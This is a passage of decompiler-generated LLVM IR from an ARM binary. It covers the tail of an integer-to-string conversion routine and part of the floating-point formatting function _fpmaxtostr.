dec_label_pc_19900:                               ; preds = %dec_label_pc_198f4
  %v1_19904 = sub i32 0, %arg3
  store i32 %v1_19904, i32* %r6.global-to-local, align 4
  %v2_19904 = icmp eq i32 %arg3, 0
  %v2_19908 = icmp eq i1 %v2_19904, false
  %v5_19908 = sext i1 %v2_19908 to i32
  %v6_19908 = sub i32 %v5_19908, %arg2
  store i32 %v6_19908, i32* %r5.global-to-local, align 4
  %v19_19908 = icmp eq i32 %v6_19908, 0
  store i1 %v19_19908, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1991c

dec_label_pc_19914:                               ; preds = %dec_label_pc_198f4, %entry
  br label %dec_label_pc_1991c

dec_label_pc_1991c:                               ; preds = %dec_label_pc_19900, %dec_label_pc_19914
  %storemerge = phi i8 [ 0, %dec_label_pc_19914 ], [ 1, %dec_label_pc_19900 ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_19924 = load i32, i32* %r7.global-to-local, align 4
  %v2_1992c = udiv i32 -1, %v0_19924
  store i32 %v2_1992c, i32* %fp.global-to-local, align 4
  %v2_1993c = urem i32 -1, %v0_19924
  %v1_19940 = add i32 %v2_1993c, 1
  store i32 %v1_19940, i32* %sb.global-to-local, align 4
  %v9_19944 = icmp eq i32 %v1_19940, %v0_19924
  store i1 %v9_19944, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_19944, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1991c
  %v1_19948 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_19948, i32* %sb.global-to-local, align 4
  %v2_1994c = add i32 %v2_1992c, 1
  store i32 %v2_1994c, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1991c, %bb
  %v0_19950 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_19950, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_19954

dec_label_pc_19954thread-pre-split:               ; preds = %bb21
  %v0_19954.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_1995c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_19954

dec_label_pc_19954:                               ; preds = %dec_label_pc_19954thread-pre-split, %.thread
  %v0_199d0 = phi i32 [ %v0_1995c.pre, %dec_label_pc_19954thread-pre-split ], [ %v0_19924, %.thread ]
  %v0_19974 = phi i32 [ %v0_19954.pr, %dec_label_pc_19954thread-pre-split ], [ %v0_19950, %.thread ]
  %v2_19954 = icmp eq i32 %v0_19974, 0
  store i1 %v2_19954, i1* %cpsr_z.global-to-local, align 1
  %v0_19958 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_19954, label %dec_label_pc_199cc, label %dec_label_pc_19964

dec_label_pc_19964:                               ; preds = %dec_label_pc_19954
  %v2_19968 = urem i32 %v0_19974, %v0_199d0
  %v2_19978 = udiv i32 %v0_19974, %v0_199d0
  store i32 %v2_19978, i32* %sl.global-to-local, align 4
  %v2_19988 = urem i32 %v0_19958, %v0_199d0
  %v0_1998c = load i32, i32* %sb.global-to-local, align 4
  %v2_1998c = mul i32 %v0_1998c, %v2_19968
  %v2_19994 = add i32 %v2_1998c, %v2_19988
  store i32 %v2_19994, i32* %r5.global-to-local, align 4
  %v2_1999c = udiv i32 %v0_19958, %v0_199d0
  %v0_199a0 = load i32, i32* %fp.global-to-local, align 4
  %v2_199a0 = mul i32 %v0_199a0, %v2_19968
  %v2_199a8 = add i32 %v2_199a0, %v2_1999c
  %v2_199b0 = udiv i32 %v2_19994, %v0_199d0
  %v2_199b8 = add i32 %v2_199a8, %v2_199b0
  br label %dec_label_pc_199e4

dec_label_pc_199cc:                               ; preds = %dec_label_pc_19954
  %v2_199dc = udiv i32 %v0_19958, %v0_199d0
  br label %dec_label_pc_199e4

dec_label_pc_199e4:                               ; preds = %dec_label_pc_19964, %dec_label_pc_199cc
  %storemerge24 = phi i32 [ %v2_199dc, %dec_label_pc_199cc ], [ %v2_199b8, %dec_label_pc_19964 ]
  %v0_19a00 = phi i32 [ %v2_199dc, %dec_label_pc_199cc ], [ %v2_199b8, %dec_label_pc_19964 ]
  %v1_19a00 = phi i32 [ 0, %dec_label_pc_199cc ], [ %v2_19978, %dec_label_pc_19964 ]
  %v2_19994.pn = phi i32 [ %v0_19958, %dec_label_pc_199cc ], [ %v2_19994, %dec_label_pc_19964 ]
  store i32 %storemerge24, i32* %r6.global-to-local, align 4
  %v0_199ec = urem i32 %v2_19994.pn, %v0_199d0
  %v3_199e4 = load i32, i32* %stack_var_0, align 4
  %v2_199e8 = icmp ugt i32 %v0_199ec, 8
  %v7_199e8 = icmp eq i32 %v0_199ec, 9
  store i1 %v7_199e8, i1* %cpsr_z.global-to-local, align 1
  %v1_199f0 = add i32 %v0_199ec, 48
  %v0_199f8 = load i32, i32* %r8.global-to-local, align 4
  %v1_199f8 = add i32 %v0_199f8, -1
  store i32 %v1_199f8, i32* %r8.global-to-local, align 4
  %v2_199fc = xor i1 %v7_199e8, true
  %v3_199fc = and i1 %v2_199e8, %v2_199fc
  %extract.t = trunc i32 %v1_199f0 to i8
  br i1 %v3_199fc, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_199e4
  %v2_199ec = add i32 %v3_199e4, %v0_199ec
  %extract.t8 = trunc i32 %v2_199ec to i8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_199e4, %bb20
  %v0_19a04.off0 = phi i8 [ %extract.t, %dec_label_pc_199e4 ], [ %extract.t8, %bb20 ]
  %v2_19a00 = or i32 %v0_19a00, %v1_19a00
  %v4_19a00 = icmp eq i32 %v2_19a00, 0
  store i1 %v4_19a00, i1* %cpsr_z.global-to-local, align 1
  %v3_19a04 = inttoptr i32 %v1_199f8 to i8*
  store i8 %v0_19a04.off0, i8* %v3_19a04, align 1
  %v0_19a08 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19a08, label %dec_label_pc_19a0c, label %dec_label_pc_19954thread-pre-split

dec_label_pc_19a0c:                               ; preds = %bb21
  %v2_19a0c = load i8, i8* %stack_var_-40, align 1
  %v2_19a10 = icmp eq i8 %v2_19a0c, 0
  store i1 %v2_19a10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19a10, label %dec_label_pc_19a0c..thread2_crit_edge, label %bb22

dec_label_pc_19a0c..thread2_crit_edge:            ; preds = %dec_label_pc_19a0c
  %v0_19a1c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb22:                                             ; preds = %dec_label_pc_19a0c
  %v3_19a18 = load i32, i32* %r8.global-to-local, align 4
  %v4_19a18 = add i32 %v3_19a18, -1
  %v5_19a18 = inttoptr i32 %v4_19a18 to i8*
  store i8 45, i8* %v5_19a18, align 1
  %v6_19a18 = load i32, i32* %r8.global-to-local, align 4
  %v7_19a18 = add i32 %v6_19a18, -1
  store i32 %v7_19a18, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_19a0c..thread2_crit_edge, %bb22
  %v0_19a1c = phi i32 [ %v0_19a1c.pre, %dec_label_pc_19a0c..thread2_crit_edge ], [ %v7_19a18, %bb22 ]
  ret i32 %v0_19a1c

; uselistorder directives
  uselistorder i32 %v0_199ec, { 3, 2, 1, 0 }
  uselistorder i32 %v0_199d0, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_199e4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1991c, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = fptrunc double %arg2 to float
  %tmp178 = bitcast float %tmp to i32
  store i32 %tmp178, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-42 = alloca i8, align 1
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-43 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-78 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_19a28 = load i32, i32* @r4, align 4
  store i32 %v3_19a28, i32* %stack_var_-36, align 4
  %v1_19a2c = add i32 %arg4, 11
  %v2_19a2c = inttoptr i32 %v1_19a2c to i8*
  %v3_19a2c = load i8, i8* %v2_19a2c, align 1
  %v4_19a2c = zext i8 %v3_19a2c to i32
  store i32 %v4_19a2c, i32* %sl.global-to-local, align 4
  %v1_19a38 = or i32 %v4_19a2c, 32
  %v7_19a3c = icmp eq i32 %v1_19a38, 97
  store i1 %v7_19a3c, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  store i32 %tmp178, i32* %r5.global-to-local, align 4
  br i1 %v7_19a3c, label %bb, label %.thread

.thread:                                          ; preds = %entry
  store i32 %arg4, i32* %r1.global-to-local, align 4
  br label %bb217

bb:                                               ; preds = %entry
  %v2_19a4c = add nuw nsw i32 %v4_19a2c, 6
  store i32 %v2_19a4c, i32* %r3.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_19a54 = urem i32 %v2_19a4c, 256
  store i32 %v2_19a54, i32* %sl.global-to-local, align 4
  br label %bb217

bb217:                                            ; preds = %.thread, %bb
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v1_19a5c = inttoptr i32 %arg4 to i32*
  %v2_19a5c = load i32, i32* %v1_19a5c, align 4
  store i32 %v2_19a5c, i32* %fp.global-to-local, align 4
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  %v1_19a6c = add i32 %arg4, 12
  %v2_19a6c = inttoptr i32 %v1_19a6c to i32*
  %v3_19a6c = load i32, i32* %v2_19a6c, align 4
  store i32 %v3_19a6c, i32* %r2.global-to-local, align 4
  %v1_19a70 = add i32 %arg4, 4
  %v2_19a70 = inttoptr i32 %v1_19a70 to i32*
  %v3_19a70 = load i32, i32* %v2_19a70, align 4
  store i32 %v3_19a70, i32* %r0.global-to-local, align 4
  %v1_19a74 = icmp slt i32 %v2_19a5c, 0
  %v2_19a74 = icmp eq i32 %v2_19a5c, 0
  store i1 %v2_19a74, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v1_19a74, label %bb218, label %bb219

bb218:                                            ; preds = %bb217
  store i32 6, i32* %fp.global-to-local, align 4
  br label %bb219

bb219:                                            ; preds = %bb217, %bb218
  %v1_19a80 = and i32 %v3_19a6c, 2
  %v2_19a80 = icmp eq i32 %v1_19a80, 0
  store i1 %v2_19a80, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-42, align 1
  br i1 %v2_19a80, label %dec_label_pc_19a94, label %dec_label_pc_19aa0

dec_label_pc_19a94:                               ; preds = %bb219
  %v1_19a94 = urem i32 %v3_19a6c, 2
  %v2_19a94 = icmp eq i32 %v1_19a94, 0
  store i1 %v2_19a94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19a94, label %dec_label_pc_19aa4, label %dec_label_pc_19aa0

dec_label_pc_19aa0:                               ; preds = %dec_label_pc_19a94, %bb219
  %storemerge = phi i32 [ 43, %bb219 ], [ 32, %dec_label_pc_19a94 ]
  %v0_19aa0.off0 = phi i8 [ 43, %bb219 ], [ 32, %dec_label_pc_19a94 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_19aa0.off0, i8* %stack_var_-42, align 1
  br label %dec_label_pc_19aa4

dec_label_pc_19aa4:                               ; preds = %dec_label_pc_19a94, %dec_label_pc_19aa0
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %tmp178, i32* %r2.global-to-local, align 4
  %v7_19ac0 = fcmp ord double %arg2, 0.000000e+00
  %not.v7_19ac0 = xor i1 %v7_19ac0, true
  %v9_19ac0 = sext i1 %not.v7_19ac0 to i32
  store i32 %v9_19ac0, i32* %r0.global-to-local, align 4
  store i1 %v7_19ac0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19ac0, label %dec_label_pc_19ad4, label %bb221

bb221:                                            ; preds = %dec_label_pc_19aa4
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_19b8c

dec_label_pc_19ad4:                               ; preds = %dec_label_pc_19aa4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v6_19ae4 = fcmp ogt double %arg2, 0.000000e+00
  %v7_19ae4 = fcmp oeq double %arg2, 0.000000e+00
  %v8_19ae4 = select i1 %v6_19ae4, i32 1, i32 -1
  %v9_19ae4 = select i1 %v7_19ae4, i32 0, i32 %v8_19ae4
  store i32 %v9_19ae4, i32* %r0.global-to-local, align 4
  store i1 %v7_19ae4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19ae4, label %dec_label_pc_19af0, label %bb222

dec_label_pc_19af0:                               ; preds = %dec_label_pc_19ad4
  store i32 0, i32* %r1.global-to-local, align 4
  %v10_19b00 = fdiv double 0xF03F0000D03F, %arg2
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v6_19b0c = fcmp ogt double %v10_19b00, 0.000000e+00
  %v7_19b0c = zext i1 %v6_19b0c to i32
  store i32 %v7_19b0c, i32* %r0.global-to-local, align 4
  %v2_19b10 = icmp eq i1 %v6_19b0c, false
  store i1 %v2_19b10, i1* %cpsr_z.global-to-local, align 1
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_19cec

bb222:                                            ; preds = %dec_label_pc_19ad4
  %v10_19b6c = fmul double %arg2, 0xD03FD4560200
  %v11_19b6c = fptrunc double %v10_19b6c to float
  %v12_19b6c = bitcast float %v11_19b6c to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %v12_19b6c, i32* %r2.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v6_19b80 = fcmp olt double %v10_19b6c, %arg2
  %v7_19b80 = fcmp oeq double %v10_19b6c, %arg2
  %v8_19b80 = select i1 %v6_19b80, i32 1, i32 -1
  %v9_19b80 = select i1 %v7_19b80, i32 0, i32 %v8_19b80
  store i32 %v9_19b80, i32* %r0.global-to-local, align 4
  store i1 %v7_19b80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19b80, label %dec_label_pc_19b8c, label %dec_label_pc_19bd0

dec_label_pc_19b8c:                               ; preds = %bb221, %bb222
  %v0_19ab8.v1_19acc6 = phi i32 [ 0, %bb222 ], [ 8, %bb221 ]
  store i32 %arg4, i32* %r0.global-to-local, align 4
  %v2_19b94 = add i32 %arg4, 16
  %v3_19b94 = inttoptr i32 %v2_19b94 to i32*
  store i32 32, i32* %v3_19b94, align 4
  %v0_19b9c = load i32, i32* %sl.global-to-local, align 4
  %v7_19b9c = icmp eq i32 %v0_19b9c, 96
  store i1 %v7_19b9c, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-160, align 4
  %tmp284 = icmp ult i32 %v0_19b9c, 97
  br i1 %tmp284, label %bb223, label %.thread131

bb223:                                            ; preds = %dec_label_pc_19b8c
  %v5_19bb0 = or i32 %v0_19ab8.v1_19acc6, 4
  store i32 %v5_19bb0, i32* %r3.global-to-local, align 4
  br label %.thread131

.thread131:                                       ; preds = %dec_label_pc_19b8c, %bb223
  %v4_19bb4 = phi i32 [ %v5_19bb0, %bb223 ], [ 3, %dec_label_pc_19b8c ]
  %v4_19bb4.v0_19ab8.v1_19acc = select i1 %tmp284, i32 %v4_19bb4, i32 %v0_19ab8.v1_19acc6
  store i32 ptrtoint ([4 x i8]* @global_var_256d4.1639 to i32), i32* %r2.global-to-local, align 4
  %v2_19bc0 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_19bc0, i32* %r7.global-to-local, align 4
  %v2_19bc4 = add i32 %v4_19bb4.v0_19ab8.v1_19acc, ptrtoint ([4 x i8]* @global_var_256d4.1639 to i32)
  store i32 %v2_19bc4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a0bc

dec_label_pc_19bd0:                               ; preds = %bb222
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -2147483648, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 9, i32* %sb.global-to-local, align 4
  store i32 256, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19c9c

dec_label_pc_19c9c:                               ; preds = %dec_label_pc_19c9c, %dec_label_pc_19bd0
  %v0_19ca0 = phi i32 [ 256, %dec_label_pc_19bd0 ], [ %v3_19ca0, %dec_label_pc_19c9c ]
  %v0_19c60 = phi i32 [ %tmp178, %dec_label_pc_19bd0 ], [ %v11_19c64, %dec_label_pc_19c9c ]
  %v0_19c00 = phi i32 [ 9, %dec_label_pc_19bd0 ], [ %v1_19c00, %dec_label_pc_19c9c ]
  %stack_var_-184.2 = phi i32 [ 8, %dec_label_pc_19bd0 ], [ %v2_19c8c, %dec_label_pc_19c9c ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_19c00 = add nsw i32 %v0_19c00, -1
  store i32 %v1_19c00, i32* %sb.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_256e8.1642 to i32), i32* %lr.global-to-local, align 4
  %v3_19c08 = mul i32 %v1_19c00, 8
  store i32 %v3_19c08, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %v0_19c60, i32* %r0.global-to-local, align 4
  %v2_19c18 = add i32 %v3_19c08, ptrtoint ([3 x i8]* @global_var_256e8.1642 to i32)
  store i32 %v2_19c18, i32* @ip, align 4
  %v1_19c58 = inttoptr i32 %v2_19c18 to i32*
  %v2_19c58 = load i32, i32* %v1_19c58, align 4
  %v3_19c58 = sext i32 %v2_19c58 to i64
  %v1_19c60 = sext i32 %v0_19c60 to i64
  %v2_19c60 = bitcast i64 %v1_19c60 to double
  %v8_19c64 = bitcast i64 %v3_19c58 to double
  %v9_19c64 = fdiv double %v2_19c60, %v8_19c64
  %v10_19c64 = fptrunc double %v9_19c64 to float
  %v11_19c64 = bitcast float %v10_19c64 to i32
  store i32 %v11_19c64, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -2147483648, i32* %r2.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_19c8c = add i32 %stack_var_-184.2, %v0_19ca0
  store i32 %v2_19c8c, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %v11_19c64, i32* %r5.global-to-local, align 4
  %v2_19c9c = icmp eq i32 %v1_19c00, 0
  %v3_19ca0 = sdiv i32 %v0_19ca0, 2
  store i32 %v3_19ca0, i32* %r4.global-to-local, align 4
  br i1 %v2_19c9c, label %dec_label_pc_19ca8, label %dec_label_pc_19c9c

dec_label_pc_19ca8:                               ; preds = %dec_label_pc_19c9c
  %v1_19cb8 = sext i32 %v11_19c64 to i64
  %v2_19cb8 = bitcast i64 %v1_19cb8 to double
  %v6_19cb8 = fcmp ogt double %v2_19cb8, 0x7F800000
  %v2_19cbc = icmp eq i1 %v6_19cb8, false
  store i1 %v2_19cbc, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v9_19cd4 = fdiv double %v2_19cb8, 4.584929e-320
  %v10_19cd4 = fptrunc double %v9_19cd4 to float
  %v11_19cd4 = bitcast float %v10_19cd4 to i32
  store i32 %v11_19cd4, i32* %r0.global-to-local, align 4
  store i32 520, i32* %r2.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %v11_19cd4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19cec

dec_label_pc_19cec:                               ; preds = %dec_label_pc_19af0, %dec_label_pc_19ca8
  %v0_19cf885 = phi i32 [ %tmp178, %dec_label_pc_19af0 ], [ %v11_19cd4, %dec_label_pc_19ca8 ]
  %stack_var_-184.6 = phi i32 [ -1, %dec_label_pc_19af0 ], [ 520, %dec_label_pc_19ca8 ]
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_19cf0 = ptrtoint i32* %stack_var_-77 to i32
  store i32 %v2_19cf0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_19cf4

dec_label_pc_19cf4:                               ; preds = %dec_label_pc_19d6c.dec_label_pc_19cf4_crit_edge, %dec_label_pc_19cec
  %v0_19d14 = phi i32 [ %v0_19cf8.pre, %dec_label_pc_19d6c.dec_label_pc_19cf4_crit_edge ], [ %v0_19cf885, %dec_label_pc_19cec ]
  %v0_19d10 = phi i32 [ %v0_19cf4.pre, %dec_label_pc_19d6c.dec_label_pc_19cf4_crit_edge ], [ %arg3, %dec_label_pc_19cec ]
  %v1_19cfc = sext i32 %v0_19d14 to i64
  %v2_19cfc = bitcast i64 %v1_19cfc to double
  %v3_19cfc = fptoui double %v2_19cfc to i32
  store i32 %v3_19cfc, i32* %r8.global-to-local, align 4
  store i32 %v0_19d10, i32* %r3.global-to-local, align 4
  store i32 %v3_19cfc, i32* %r2.global-to-local, align 4
  store i32 %v0_19d10, i32* %r1.global-to-local, align 4
  store i32 %v0_19d14, i32* @r0, align 4
  %v6_19d18 = call i32 @__aeabi_dsub(i32 %v0_19d14, i32 %v0_19d10, i32 %v3_19cfc, i32 %v0_19d10)
  %v7_19d18 = sext i32 %v6_19d18 to i64
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 2139095040, i32* %r2.global-to-local, align 4
  %v3_19d24 = bitcast i64 %v7_19d18 to double
  %v9_19d24 = fmul double %v3_19d24, 0x65CDCD4100002440
  %v10_19d24 = fptrunc double %v9_19d24 to float
  %v11_19d24 = bitcast float %v10_19d24 to i32
  store i32 %v11_19d24, i32* %r0.global-to-local, align 4
  %v0_19d28 = load i32, i32* %sb.global-to-local, align 4
  %v1_19d28 = add i32 %v0_19d28, 9
  store i32 %v1_19d28, i32* %sb.global-to-local, align 4
  store i32 %v0_19d10, i32* %r6.global-to-local, align 4
  store i32 %v11_19d24, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_19d38.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_19d38

dec_label_pc_19d38:                               ; preds = %dec_label_pc_19d38.dec_label_pc_19d38_crit_edge, %dec_label_pc_19cf4
  %v1_19d4c = phi i32 [ %v1_19d4c.pre, %dec_label_pc_19d38.dec_label_pc_19d38_crit_edge ], [ %v1_19d28, %dec_label_pc_19cf4 ]
  %v0_19d44 = phi i32 [ %v0_19d60, %dec_label_pc_19d38.dec_label_pc_19d38_crit_edge ], [ 0, %dec_label_pc_19cf4 ]
  %v0_19d50 = phi i32 [ %v2_19d5c, %dec_label_pc_19d38.dec_label_pc_19d38_crit_edge ], [ %v0_19d38.pre, %dec_label_pc_19cf4 ]
  %v2_19d40 = urem i32 %v0_19d50, 10
  %v1_19d44 = add i32 %v0_19d44, 1
  store i32 %v1_19d44, i32* %r7.global-to-local, align 4
  %v1_19d48 = or i32 %v2_19d40, 48
  store i32 %v1_19d48, i32* %r2.global-to-local, align 4
  %v2_19d4c = sub i32 %v1_19d4c, %v1_19d44
  store i32 %v2_19d4c, i32* %r3.global-to-local, align 4
  store i32 %v0_19d50, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_19d58 = trunc i32 %v1_19d48 to i8
  %v3_19d58 = inttoptr i32 %v2_19d4c to i8*
  store i8 %v1_19d58, i8* %v3_19d58, align 1
  %v0_19d5c = load i32, i32* %r0.global-to-local, align 4
  %v1_19d5c = load i32, i32* %r1.global-to-local, align 4
  %v2_19d5c = udiv i32 %v0_19d5c, %v1_19d5c
  store i32 %v2_19d5c, i32* %r0.global-to-local, align 4
  %v0_19d60 = load i32, i32* %r7.global-to-local, align 4
  %v7_19d60 = icmp eq i32 %v0_19d60, 8
  store i1 %v7_19d60, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_19d5c, i32* %r8.global-to-local, align 4
  %v7_19d68 = icmp slt i32 %v0_19d60, 9
  br i1 %v7_19d68, label %dec_label_pc_19d38.dec_label_pc_19d38_crit_edge, label %dec_label_pc_19d6c

dec_label_pc_19d38.dec_label_pc_19d38_crit_edge:  ; preds = %dec_label_pc_19d38
  %v1_19d4c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_19d38

dec_label_pc_19d6c:                               ; preds = %dec_label_pc_19d38
  %v0_19d6c = load i32, i32* %r4.global-to-local, align 4
  %v1_19d6c = add i32 %v0_19d6c, 1
  store i32 %v1_19d6c, i32* %r4.global-to-local, align 4
  %v7_19d70 = icmp eq i32 %v0_19d6c, 0
  store i1 %v7_19d70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19d70, label %dec_label_pc_19d6c.dec_label_pc_19cf4_crit_edge, label %dec_label_pc_19d78

dec_label_pc_19d6c.dec_label_pc_19cf4_crit_edge:  ; preds = %dec_label_pc_19d6c
  %v0_19cf4.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_19cf8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19cf4

dec_label_pc_19d78:                               ; preds = %dec_label_pc_19d6c
  %v0_19d78 = load i32, i32* %sl.global-to-local, align 4
  %v7_19d78 = icmp eq i32 %v0_19d78, 96
  store i1 %v7_19d78, i1* %cpsr_z.global-to-local, align 1
  %tmp285 = icmp ult i32 %v0_19d78, 97
  br i1 %tmp285, label %bb224, label %thread-pre-split

bb224:                                            ; preds = %dec_label_pc_19d78
  %v5_19d88 = add i32 %v0_19d78, 32
  store i32 %v5_19d88, i32* %r3.global-to-local, align 4
  %v5_19d8c = urem i32 %v5_19d88, 256
  store i32 %v5_19d8c, i32* %sl.global-to-local, align 4
  br label %bb225

thread-pre-split:                                 ; preds = %dec_label_pc_19d78
  %v4_19d84.pre138144 = load i32, i32* %r3.global-to-local, align 4
  %phitmp = urem i32 %v4_19d84.pre138144, 256
  br label %bb225

bb225:                                            ; preds = %thread-pre-split, %bb224
  %v4_19d84135140 = phi i32 [ %phitmp, %thread-pre-split ], [ 69, %bb224 ]
  %v0_19dac = phi i32 [ %v0_19d78, %thread-pre-split ], [ %v5_19d8c, %bb224 ]
  %v7_19d90 = icmp eq i32 %v0_19dac, 103
  %. = zext i1 %v7_19d90 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_19d9c = load i32, i32* %fp.global-to-local, align 4
  %v2_19d9c = icmp eq i32 %v0_19d9c, 0
  store i1 %v2_19d9c, i1* %cpsr_z.global-to-local, align 1
  %tmp228 = icmp slt i32 %v0_19d9c, 1
  br i1 %tmp228, label %.thread10, label %bb229

.thread10:                                        ; preds = %bb225
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb231

bb229:                                            ; preds = %bb225
  %v2_19da4 = icmp eq i1 %v7_19d90, false
  store i1 %v2_19da4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19da4, label %bb231, label %bb230

bb230:                                            ; preds = %bb229
  %v2_19da8 = add i32 %v0_19d9c, -1
  store i32 %v2_19da8, i32* %fp.global-to-local, align 4
  br label %bb231

bb231:                                            ; preds = %.thread10, %bb229, %bb230
  %v0_19dbc = phi i32 [ %v0_19d9c, %.thread10 ], [ %v0_19d9c, %bb229 ], [ %v2_19da8, %bb230 ]
  %v7_19dac = icmp eq i32 %v0_19dac, 102
